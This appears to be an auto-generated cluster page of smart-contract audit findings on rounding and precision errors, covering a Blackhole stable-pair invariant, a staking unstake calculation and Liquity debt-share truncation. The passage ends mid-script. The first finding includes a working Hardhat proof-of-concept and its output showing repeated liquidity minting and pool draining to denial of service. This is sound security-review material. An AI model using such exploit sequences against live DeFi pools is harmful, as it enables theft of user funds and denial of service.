# Cluster -1236

**Rank:** #209  
**Count:** 52  

## Label
Precision errors in invariant checks due to flawed arithmetic operations, rounding, or improper scaling lead to invalid state transitions and enable attackers to manipulate or extract value without respecting pool constraints.

## Cluster Information
- **Total Findings:** 52

## Examples

### Example 1

**Auto Label:** Insufficient invariant validation and error handling in stable pool calculations lead to DOS, asset drain, or incorrect state visibility due to rounding, missing guards, or race conditions.  

**Original Text Preview:**

<https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol# L481>

<https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol# L344>

### Finding description

Rounding errors in the calculation of the invariant `k` can result in zero value for stable pools, allowing malicious actors to DOS the pool.

In the `Pair` contract, the invariant `k` of a stable pool is calculated as follows:
```

 function _k(uint x, uint y) internal view returns (uint) {
        if (stable) {
            uint _x = (x * 1e18) / decimals0;
            uint _y = (y * 1e18) / decimals1;
    @>>     uint _a = (_x * _y) / 1e18;
            uint _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18);
            return (_a * _b) / 1e18; // x3y+y3x >= k
        } else {
            return x * y; // xy >= k
        }
    }
```

The value of `_a = (x * y) / 1e18` becomes zero due to rounding errors when `x * y < 1e18`. This rounding error can result in the invariant k of stable pools equaling zero, allowing a trader to steal the remaining assets in the pool. A malicious first liquidity provider can DOS the pair by:

* Minting a small amount of liquidity to the pool.
* Stealing the remaining assets in the pool.
* Repeating steps 1 and 2 until the total supply overflows.

### Impact

Pool will be DOSsed for other users to use.

### Recommended mitigation steps
```

function mint(address to) external lock returns (uint liquidity) {
        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);
        uint _balance0 = IERC20(token0).balanceOf(address(this));
        uint _balance1 = IERC20(token1).balanceOf(address(this));
        uint _amount0 = _balance0 - _reserve0;
        uint _amount1 = _balance1 - _reserve1;

        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;
            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
+           if (stable) { require(_k(_amount0, _amount1) > MINIMUM_K; }
        } else {
            liquidity = Math.min(
                (_amount0 * _totalSupply) / _reserve0,
                (_amount1 * _totalSupply) / _reserve1
            );
        }
        require(liquidity > 0, "ILM"); // Pair: INSUFFICIENT_LIQUIDITY_MINTED
        _mint(to, liquidity);

        _update(_balance0, _balance1, _reserve0, _reserve1);
        emit Mint(msg.sender, _amount0, _amount1);
    }
```

### Proof of Concept
```

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Pair Vulnerability Test (First Liquidity Provider DOS)", function () {
    let deployer, attacker;
    let MockERC20, dai, frax;
    let PairFactory, factory;
    let PairGenerator, pairGenerator; // Added PairGenerator
    let Pair; // To interact with the Pair contract instance

    const MINT_AMOUNT = ethers.BigNumber.from("10000000"); // 10_000_000 wei (as in PoC)
    const INITIAL_TOKEN_SUPPLY_FOR_ATTACKER = ethers.utils.parseEther("10000"); // 10,000 full tokens

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Mock ERC20 tokens
        const MockERC20Factory = await ethers.getContractFactory("MockERC20", deployer);
        dai = await MockERC20Factory.deploy("Dai Stablecoin", "DAI", 18);
        await dai.deployed();

        frax = await MockERC20Factory.deploy("Frax Stablecoin", "FRAX", 18);
        await frax.deployed();

        // Mint tokens to attacker
        await dai.connect(deployer).mint(attacker.address, INITIAL_TOKEN_SUPPLY_FOR_ATTACKER);
        await frax.connect(deployer).mint(attacker.address, INITIAL_TOKEN_SUPPLY_FOR_ATTACKER);

        // Deploy PairGenerator
        const PairGeneratorFactory = await ethers.getContractFactory("PairGenerator", deployer);
        pairGenerator = await PairGeneratorFactory.deploy();
        await pairGenerator.deployed();

        // Deploy PairFactory
        const PairFactoryFactory = await ethers.getContractFactory("PairFactory", deployer);
        factory = await PairFactoryFactory.deploy();
        await factory.deployed();

        // Initialize PairFactory
        await factory.connect(deployer).initialize(pairGenerator.address);

        // Get Pair contract factory for later use
        Pair = await ethers.getContractFactory("Pair", deployer);
    });

    // Modified drainPair to use current balances from the pair
    async function drainPair(pairInstance, currentAttacker, token0, token1) {
        let t0, t1;
        if (token0.address.toLowerCase() < token1.address.toLowerCase()) {
            t0 = token0;
            t1 = token1;
        } else {
            t0 = token1;
            t1 = token0;
        }

        // Get current balances from the pair contract right before draining
        let currentBalanceT0InPair = await t0.balanceOf(pairInstance.address);
        let currentBalanceT1InPair = await t1.balanceOf(pairInstance.address);

        // Attacker sends 1 of token0 to the pair to facilitate the first swap
        await t0.connect(currentAttacker).transfer(pairInstance.address, 1);
        currentBalanceT0InPair = currentBalanceT0InPair.add(1); // Update local tracking

        // Attacker swaps out (current balance of token1 - 1) from the pair
        // Ensure we don't try to swap more than available or zero if balance is already 1 or less
        const amountT1ToSwapOut = currentBalanceT1InPair.gt(0) ? currentBalanceT1InPair.sub(1) : ethers.BigNumber.from(0);
        if (amountT1ToSwapOut.gt(0)) {
             await pairInstance.connect(currentAttacker).swap(0, amountT1ToSwapOut, currentAttacker.address, "0x");
        }

// Get actual balance of t0 after the first swap (it might have changed due to swap mechanics if _k was not 0)
        currentBalanceT0InPair = await t0.balanceOf(pairInstance.address);
        // Get actual balance of t1 after the first swap
        currentBalanceT1InPair = await t1.balanceOf(pairInstance.address);

        // Attacker sends 1 of token1 to the pair to facilitate the second swap
        await t1.connect(currentAttacker).transfer(pairInstance.address, 1);
        currentBalanceT1InPair = currentBalanceT1InPair.add(1); // Update local tracking

        // Attacker swaps out (current balance of token0 -1) from the pair to leave 1 behind
        // This is to match the PoC's final state of 1 t0 and 2 t1
        const amountT0ToSwapOut = currentBalanceT0InPair.gt(0) ? currentBalanceT0InPair.sub(1) : ethers.BigNumber.from(0);
        if (amountT0ToSwapOut.gt(0)) {
            await pairInstance.connect(currentAttacker).swap(amountT0ToSwapOut, 0, currentAttacker.address, "0x");
        }
    }

    it.only("should demonstrate the K value vulnerability leading to DOS", async function () {
        // Determine token0 and token1 based on addresses for createPair
        let tokenA, tokenB;
        if (dai.address.toLowerCase() < frax.address.toLowerCase()) {
            tokenA = dai; // token0
            tokenB = frax; // token1
        } else {
            tokenA = frax; // token0
            tokenB = dai; // token1
        }

        // Create a stable pair
        // The deployer of PairFactory is the owner and can create pairs
        const tx = await factory.connect(deployer).createPair(tokenA.address, tokenB.address, true);
        const receipt = await tx.wait();
        const pairAddress = await factory.getPair(tokenA.address, tokenB.address, true);
        expect(pairAddress).to.not.equal(ethers.constants.AddressZero, "Pair address should not be zero");

        const pair = Pair.attach(pairAddress);

        console.log(`Pair Address: ${pair.address}`);
        console.log(`Token0: ${await pair.token0()} (${tokenA.address === await pair.token0() ? await tokenA.symbol() : await tokenB.symbol()})`);
        console.log(`Token1: ${await pair.token1()} (${tokenB.address === await pair.token1() ? await tokenB.symbol() : await tokenA.symbol()})`);

        const numCycles = 11;
        for (let i = 0; i < numCycles; i++) {
            console.log(`\nCycle ${i + 1}/${numCycles}`);

            // Attacker transfers MINT_AMOUNT of each token to the pair
            await tokenA.connect(attacker).transfer(pair.address, MINT_AMOUNT);
            await tokenB.connect(attacker).transfer(pair.address, MINT_AMOUNT);
            console.log(`  Transferred ${MINT_AMOUNT.toString()} of ${await tokenA.symbol()} and ${await tokenB.symbol()} to pair.`);

            // Attacker mints LP tokens
            const mintTx = await pair.connect(attacker).mint(attacker.address);
            const mintReceipt = await mintTx.wait();
            // Find the Mint event to get actual minted liquidity amount (optional, for detailed logging)
            // const mintEvent = mintReceipt.events.find(e => e.event === 'Mint');
            // const mintedLP = mintEvent.args.liquidity; // This might not be the direct LP amount, depends on Pair event

            const lpBalance = await pair.balanceOf(attacker.address);
            const totalSupply = await pair.totalSupply();
            console.log(`  Minted LP. Attacker LP Balance: ${lpBalance.toString()}, Pair TotalSupply: ${totalSupply.toString()}`);

            // Call drainPair without initial balances, it will fetch them
            await drainPair(pair, attacker, tokenA, tokenB);
            console.log("  Called drainPair.");

            const pairTokenABalance = await tokenA.balanceOf(pair.address);
            const pairTokenBBalance = await tokenB.balanceOf(pair.address);
            console.log(`  Pair ${await tokenA.symbol()} balance after drain: ${pairTokenABalance.toString()}`);
            console.log(`  Pair ${await tokenB.symbol()} balance after drain: ${pairTokenBBalance.toString()}`);

            // Assertions based on PoC logs (DAI balance: 1, FRAX balance: 2)
            // Token A (e.g. DAI if token0) should be 1
            // Token B (e.g. FRAX if token1) should be 2
            if (tokenA.address === await pair.token0()) {
                expect(pairTokenABalance).to.equal(1, `Cycle ${i+1}: ${await tokenA.symbol()} balance in pair should be 1 after drain`);
                expect(pairTokenBBalance).to.equal(2, `Cycle ${i+1}: ${await tokenB.symbol()} balance in pair should be 2 after drain`);
            } else { // tokenB is token0
                expect(pairTokenBBalance).to.equal(1, `Cycle ${i+1}: ${await tokenB.symbol()} balance in pair should be 1 after drain`);
                expect(pairTokenABalance).to.equal(2, `Cycle ${i+1}: ${await tokenA.symbol()} balance in pair should be 2 after drain`);
            }
        }

        console.log("\nAttempting final mint which should fail...");
        // Last attempt to mint after inflating totalSupply
        await tokenA.connect(attacker).transfer(pair.address, MINT_AMOUNT);
        await tokenB.connect(attacker).transfer(pair.address, MINT_AMOUNT);

        await expect(
            pair.connect(attacker).mint(attacker.address)
        ).to.be.reverted; // PoC expects revert, likely due to overflow or ILM with huge totalSupply

        console.log("\nTest finished: Successfully demonstrated vulnerability and final mint reverted.");
    });
});
```


```

Pair Vulnerability Test (First Liquidity Provider DOS)
Pair Address: 0x0CECE5951F0aa1b0916435405acEC8dB1fD49Ef9
Token0: 0x5FbDB2315678afecb367f032d93F642f64180aa3 (DAI)
Token1: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 (FRAX)

Cycle 1/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 9999000, Pair TotalSupply: 10000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 2/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 50000009999000, Pair TotalSupply: 50000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 3/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 250000100000009999000, Pair TotalSupply: 250000100000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 4/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 1250000750000150000009999000, Pair TotalSupply: 1250000750000150000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 5/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 6250005000001500000200000009999000, Pair TotalSupply: 6250005000001500000200000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 6/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 31250031250012500002500000250000009999000, Pair TotalSupply: 31250031250012500002500000250000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 7/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 156250187500093750025000003750000300000009999000, Pair TotalSupply: 156250187500093750025000003750000300000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 8/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 781251093750656250218750043750005250000350000009999000, Pair TotalSupply: 781251093750656250218750043750005250000350000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 9/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 3906256250004375001750000437500070000007000000400000009999000, Pair TotalSupply: 3906256250004375001750000437500070000007000000400000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 10/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 19531285156278125013125003937500787500105000009000000450000009999000, Pair TotalSupply: 19531285156278125013125003937500787500105000009000000450000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Cycle 11/11
  Transferred 10000000 of DAI and FRAX to pair.
  Minted LP. Attacker LP Balance: 97656445312675781343750032812507875001312500150000011250000500000009999000, Pair TotalSupply: 97656445312675781343750032812507875001312500150000011250000500000010000000
  Called drainPair.
  Pair DAI balance after drain: 1
  Pair FRAX balance after drain: 2

Attempting final mint which should fail...

Test finished: Successfully demonstrated vulnerability and final mint reverted.
    ✔ should demonstrate the K value vulnerability leading to DOS (1262ms)
```

**[Blackhole mitigated](https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues)**

**Status:** Mitigation confirmed. Full details in reports from [maxvzuvex](https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-60) and [rayss](https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-49).

The sponsor team requested that the following note be included:

> This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
> Reference: <https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol# L344>

---

---
### Example 2

**Auto Label:** Rounding and truncation errors in share and token calculations enable attackers to extract profits, drain rewards, or manipulate allocations through imprecise arithmetic and insufficient edge-case validation.  

**Original Text Preview:**

In the `Staking.unstake()` function, the calculation of the shares to be burned for the user is done as follows:

```solidity
79:         uint256 userShare = (userStaked * totalTokenBalance) / info.totalStaked;
80:         require(amount <= userShare, "Cannot unstake more than share");
81:         uint256 fraction = (amount * 1e18) / userShare;
82:
83:         // Decrease user's staked balance proportionally
84:         uint256 sharesToBurn = (userStaked * fraction) / 1e18;
```

The results of the division operations in lines 81 and 84 are rounded down due to the truncation of the division operation, meaning that the shares burned by the user might be underestimated.

Let's consider the following example:

- amount = 1
- userStaked = 10
- totalStaked = 100
- totalTokenBalance = 110
- userShare = 10 \* 110 / 100 = 11
- fraction = 1 \* 1e18 / 11 = 90909090909090909
- sharesToBurn = 10 \* 90909090909090909 / 1e18 = 0

In this case, the user is able to withdraw 1 token, but the shares burned are 0.

The minimum unit of a token is usually a negligible amount, but in the case of tokens with few decimals and high values, the amount can be significant. For example, in WBTC (8 decimals) the minimum unit is valued at approximately 0.001 USD (at current prices) and, the minimum unit of GUSD (2 decimals) is valued at 0.01 USD. In an extreme case where a token with few decimals and high value is used, this attack vector could be exploited to drain the staking pool.

Round up the calculation of `fraction` and `sharesToBurn`, capping the final value to the staked balance of the user.

---
### Example 3

**Auto Label:** Truncation in integer arithmetic causes cumulative precision loss, enabling attackers to evade fees, manipulate debt distribution, and drain funds through systematic rounding errors in interest and share calculations.  

**Original Text Preview:**

**Impact**

This finding summarizes my research on how Truncation could be abused, the goal is to define the mechanisms and quantify the impacts

**Minting of Batch Shares**

Minting (and burning) of batch shares boils down to this line:

https://github.com/liquity/bold/blob/a34960222df5061fa7c0213df5d20626adf3ecc4/contracts/src/TroveManager.sol#L1748-L1749

```solidity
                    batchDebtSharesDelta = currentBatchDebtShares * debtIncrease / _batchDebt;

```

The maximum error here is the ratio of Debt / Shares - 1 meaning that if we rebased the shares to have a 20 Debt per Shares ratio, we can cause at most a rounding that will cause a remainder of 19 debt

This has been explored further in #39  and #40 

**Calculation of Trove Debt**

Boils down to this line:

https://github.com/liquity/bold/blob/a34960222df5061fa7c0213df5d20626adf3ecc4/contracts/src/TroveManager.sol#L932-L933

```solidity
            _latestTroveData.recordedDebt = _latestBatchData.recordedDebt * batchDebtShares / totalDebtShares;

```

The line is distributing the total debt over the total debt shares

The maximum error for this is the % of ownership of `batchDebtShares` over the `totalDebtShares`

Meaning that if we can have very little ownership, we can have a fairly big error

I can imagine the error being used to:
- Skip on paying borrow fees
- Skip on paying management fees

As those 2 operations increase the Debt/Shares

This Python script illustrates the impact 

```python
"""
    The code below demosntrates that:
    - Given a rebased share
    - The maximum amount of debt forgiven for a Trove will be roughly equal to the order of magnitude
        difference between the shares of the Trove and the Shares of the Batch
    
"""

---
